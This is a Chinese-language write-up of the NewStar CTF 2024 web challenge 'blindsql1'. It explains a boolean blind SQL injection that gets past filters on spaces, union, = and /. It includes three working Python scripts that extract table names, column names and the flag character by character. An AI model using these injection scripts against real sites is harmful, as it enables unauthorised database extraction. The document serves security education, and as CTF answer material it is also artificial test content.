# blindsql1

> 分类：Web

## 题目描述
能根据姓名查询成绩。加入单引号时查询失败，存在注入。尝试 `Alice' or 1=1#`（`#` 需 URL 编码为 `%23`）时提示空格被禁用；多次尝试发现 `union`、`=`、`/` 都被禁用。

## 考察知识点
- SQL 布尔盲注
- waf 绕过（`=` 用 like/in 代替，空格和 `/` 用括号代替）

## 解法
`union` 被禁用，用布尔盲注（`and 1` / `and 0` 控制是否返回数据）。`=` 用 `like` 或 `in` 代替，空格和 `/` 用括号代替。

爆破表名：
```python
import requests,string,time
url = ''
result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.2)
        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'
        char = f'(ord(mid({tables},{i},1)))'
        b = f'(({char})in({ord(c)}))'
        p = f'Alice\'and({b})#'
        res = requests.get(url, params={'student_name': p})
        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破 `secrets` 表的列名：
```python
import requests,string,time
url = ''
result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01)
        tables = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'
        char = f'(ord(mid({tables},{i},1)))'
        b = f'(({char})in({ord(c)}))'
        p = f'Alice\'and({b})#'
        res = requests.get(url, params={'student_name': p})
        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破 flag：
```python
import requests,string,time
url = ''
result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01)
        tables = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'
        char = f'(ord(mid({tables},{i},1)))'
        b = f'(({char})in({ord(c)}))'
        p = f'Alice\'and({b})#'
        res = requests.get(url, params={'student_name': p})
        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week3/web/blindsql1.html
